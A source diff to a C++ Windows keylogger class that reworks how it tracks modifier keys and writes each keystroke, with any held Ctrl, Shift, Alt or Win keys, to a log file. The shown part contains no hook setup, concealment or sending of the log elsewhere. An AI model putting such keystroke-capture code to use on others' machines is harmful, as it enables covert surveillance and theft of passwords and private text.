@@ -21,6 +21,7 @@ std::map<DWORD, const char*> vkMapToStr = {
 	{ VK_TAB ,			"Tab" },
 	{ VK_SPACE ,		"Space" },
 	{ VK_RETURN ,		"Enter" },
+	{ VK_BACK ,			"Back" },
 
 	{ VK_END ,			"End" },
 	{ VK_HOME ,			"Home" },
@@ -38,8 +39,6 @@ std::map<DWORD, const char*> vkMapToStr = {
 	{ VK_SLEEP ,		"Sleep" },
 	{ VK_SNAPSHOT ,		"PrtSC" },
 	{ VK_PAUSE ,		"Pause" },
-	{ VK_BACK ,			"Back" },
-	
 	
 	{ VK_NUMLOCK ,		"NumLock" },
 	{ VK_SCROLL ,		"ScrollLock" },
@@ -86,7 +85,7 @@ std::map<DWORD, const char*> vkMapToStr = {
 	{ VK_OEM_2 ,		"/?" },
 	{ VK_OEM_3 ,		"`~" },
 	{ VK_OEM_4 ,		"[{" },
-	{ VK_OEM_5 ,		"\|" },
+	{ VK_OEM_5 ,		"\\|" },
 	{ VK_OEM_6 ,		"]}" },
 	{ VK_OEM_7 ,		"'\"" },
 
@@ -141,25 +140,29 @@ public:
 	}
 
 	void OnKeyDown(const DWORD& vk) {
-		auto it = std::find(m_keyLoggerStack.begin(), m_keyLoggerStack.end(), vk);
-		if (it == m_keyLoggerStack.end()){
-			m_keyLoggerStack.push_back(vk);
+		if (IsModifierKey(vk)){
+			auto it = std::find(m_modifierStack.begin(), m_modifierStack.end(), vk);
+			if (it == m_modifierStack.end()) {
+				m_modifierStack.push_back(vk);
+			}
+		} else {
+			if (PrintModifier()) {
+				m_logFile << vkMapToStr[vk] << std::endl;
+			} else {
+				m_logFile << vkMapToStr[vk] << " ";
+			}
 		}
 	}
 
 	void OnKeyUp(const DWORD& vk) {
-		auto itFind = std::find(m_keyLoggerStack.begin(), m_keyLoggerStack.end(), vk);
-		if (itFind == m_keyLoggerStack.end()) {			
+		if (!IsModifierKey(vk))
+			return;
+
+		auto itFind = std::find(m_modifierStack.begin(), m_modifierStack.end(), vk);
+		if (itFind != m_modifierStack.end()) {
+			m_modifierStack.erase(itFind);
 			return;
 		}
-		if (vk != VK_LCONTROL && vk != VK_RCONTROL && vk != VK_LSHIFT && vk != VK_RSHIFT && vk != VK_LMENU && vk != VK_RMENU) {
-			for (int i = 0; i < m_keyLoggerStack.size() - 1; ++i) {
-				m_logFile << vkMapToStr[m_keyLoggerStack[i]] << " + ";
-			}
-
-			m_logFile << vkMapToStr[m_keyLoggerStack[m_keyLoggerStack.size() - 1]] << std::endl;
-		}
-		m_keyLoggerStack.pop_back();
 	}
 
 private:
@@ -169,10 +172,31 @@ private:
 			std::cout << "Open File failed!" << std::endl;
 	}
 
+	bool IsModifierKey(const DWORD& vk) {
+		if (vk != VK_LCONTROL && vk != VK_RCONTROL 
+			&& vk != VK_LSHIFT && vk != VK_RSHIFT 
+			&& vk != VK_LMENU && vk != VK_RMENU
+			&& vk != VK_LWIN && vk != VK_RWIN
+			) {
+
+			return false;
+		}
+		return true;
+	}
+
+	bool PrintModifier() {
+		if (m_modifierStack.size() == 0) return false;
+
+		m_logFile << std::endl;
+		for (std::size_t i = 0; i < m_modifierStack.size(); ++i) {
+			m_logFile << vkMapToStr[m_modifierStack[i]] << " + ";
+		}
+		return true;
+	}
 private:
 	std::string					m_logFilePath;
 	std::ofstream				m_logFile;
-	std::vector<DWORD>		m_keyLoggerStack;
+	std::vector<DWORD>			m_modifierStack;
 };
 
 
